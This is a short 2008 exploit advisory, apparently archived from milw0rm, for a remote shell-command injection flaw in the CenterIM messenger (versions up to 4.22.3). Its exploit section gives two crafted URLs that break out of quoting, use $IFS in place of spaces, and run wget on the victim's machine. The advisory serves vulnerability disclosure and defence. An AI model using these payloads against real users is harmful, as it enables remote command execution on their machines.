@@ -1,0 +1,47 @@
+#######################################################################
+
+Application:  CenterIM
+              http://www.centerim.org/index.php/Main_Page
+Versions:     centerim <= 4.22.3
+OS:           Linux
+Bug:          Execution of shell commands
+Exploit:      remote
+Date:         15 March 2008
+Author:       Brian Fonfara (w00)
+   eMail:    brian.fonfara@gmx.de
+   Web:       newb.kicks-ass.net
+
+
+#######################################################################
+
+1) Bug
+2) Exploit
+
+
+#######################################################################
+
+=======
+1) Bug
+=======
+
+Received URLs in the message window do not get checked for illegal
+characters, like "\'", "\"", ";", "$", "{", "}", "&&" and "||"
+
+#######################################################################
+
+===========
+2) Exploit
+===========
+
+Standard settings:
+- Browser already open:
+http://gidf.de/centerim)';cd$IFS$HOME/Desktop;wget${IFS}http://google.de;'(
+
+- New browser instance:
+http://gidf.de/centerim"&cd$IFS$HOME/Desktop;wget${IFS}http://google.de"
+
+#######################################################################
+
+Greets to: mrks
+
+# milw0rm.com [2008-03-20]
